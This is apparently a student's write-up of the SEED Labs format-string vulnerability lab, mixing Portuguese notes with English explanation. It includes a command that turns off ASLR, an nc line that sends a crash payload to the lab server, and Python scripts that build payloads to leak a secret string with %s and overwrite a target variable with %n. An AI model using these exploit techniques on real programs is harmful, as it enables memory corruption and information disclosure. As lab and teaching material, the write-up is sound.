<!--
Notes:
format strings parecido com buffer overflow
menos tecnico que buffer overflow

ctf relativamente simples
-->
# Seed labs guide (Format-String vulnerability Lab)

<!--from the guide:
Some programs allow users to provide the entire or part of the
contents in a format string. If such contents are not sanitized, malicious users can use this opportunity to get
the program to run arbitrary code. A problem like this is called format string vulnerability.
--
$ sudo sysctl -w kernel.randomize_va_space=0
>
<!--
argumentos na stack
f {
printf("%d", n);
}
stack:
stack frame de f
%d
n

printf("%d %d", n)
vai ler cenas arbitrárias da stack
%d %d %d ... ler qqer cena da stack

printf("%d", n)
string "%d"
n
address to the string (in the stack)

e.g.
f(4, 5)
stack:
5
4  <- f points to here


printf("%d")

stack:
string (e.g "%d")
&string


printf("ABCD%d")

stack:
ABCD%d      %x  -> dá o ABCD (primeiros 4 bytes da string e depois vai imprimir os propios valores de %d)
&string     %x


"0xABCD%d" (ABCD como bytes)
ao imprimir %d vai aparacer igual (ABCD)

Quantos percentagens precisas de ter para chegar à tua string
ataque:
%x%x...%s
-->
<!--
compiling the program with make -> we can see some compilation warnings related to format strings
-->

<!--
crashed with python3 -c 'print("%s" * 1500) > file.txt
cat file.txt | nc 10.9.0.5 9090
did not print anything
-->

<!--
target 0x11223344

secret message 0x080b4008

-->



<!--
python3 -c 'print("ABCD " + "%.8x " * 64)' > badfile
para chegar ao 44434241 (ABCD em little-endian) precisamos de 64 %x
-->
<!--
@
1122334410008049db580e532080e61c0ffffd800ffffd72880e62d480e5000ffffd7c88049f7effffd8000648049f4780e53205dc5dcffffd800ffffd80080e9720000000000000000000000000018de4c0080e500080e5000ffffdde88049effffffd8005dc5dc80e5320000ffffdeb40005dcA secret message

-->

%s finds the address `0x080b4008` and prints the string at that address. Normally, this would be an argument passed to the function, but here we can exploit this passing it in the string.
```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080b4008
content[0:4] = (number).to_bytes(4,byteorder='little')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%x" * 63 + "%s"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4 + len(fmt)] = fmt

# This line shows how to store a 4-byte string at offset 4
# content[4:8]  =  ("abcd").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

<!--
Objective: change the target's variable value.
The address is 0x080e5068, in comparison to secret_message's address 0x080b4008

-->


Here, instead of reading the string at the address given, we will be changing the value at the address given. Before, we read the values in the address, now we change that value to be the number of bytes read so far.
A normal use of this would be
```c
printf("Hello, world!%n\n", &charCount);
```
Here, there is no argument passed. In fact, the argument that is effectively seen by printf is the address that we give it. This address for 3.A is the target's variable address, so we are effectively changing its value.
```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e5068
content[0:4] = (number).to_bytes(4,byteorder='little')

s = "%x" * 63 + "%n"

# The line shows how to store the string s at offset 4
fmt  = (s).encode('latin-1')
content[4:4 + len(fmt)] = fmt

# This line shows how to store a 4-byte string at offset 4
# content[4:8]  =  ("abcd").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)

```

After the execution of `myprintf`, the value of the variable is no longer 11223344, and is now 0x000000ec, which is 236 in decimal, the number of bytes read so far.

To modify it to be 0x5000, which is 20480 in decimal, we need to read 20480 bytes before the %n.

In the example below, we'll be reading 8 characters for each of the %x we have. Before the 0s were not printed and no empty space. Now the empty space is printed, effectively printing 8 characters for each of the hexadecimal prints. 63 * 8 = 504, and the value of the target variable is 0x1fc, which is 508 in decimal. This is because of the first four bytes read in binary corresponding to the address of the target variable (0x080e5068), as shown below.

```python
number  = 0x080e5068
content[0:4] = (number).to_bytes(4,byteorder='little')

s = "%8x" * 63 + "%n"
```

So, now we just need to make a %x have more characters printed (these will be empty spaces, but it counts towards counting bytes written, for the "%n"). We need 20480 bytes and have 508, so we just need to add 20480 - 508 = 19972 empty spaces to the string. 
So, on the last %x, instead of just printing 8 characters, we'll print 19980 characters.
See the string s below.
<!--
The last %x is changed to %19980x, and the number of %x is changed to 62, so that we have 62 * 8 + 19980 = 20480 characters printed, which is the number of bytes we need to write to the target variable.
-->
```python
number  = 0x080e5068
content[0:4] = (number).to_bytes(4,byteorder='little')

s = "%8x" * 62 + "%19980x" + "%n"
```

As expected, a lot of empty spaces were printed in the server output and, in the end, we could see that the target variable's value was changed to 0x5000.
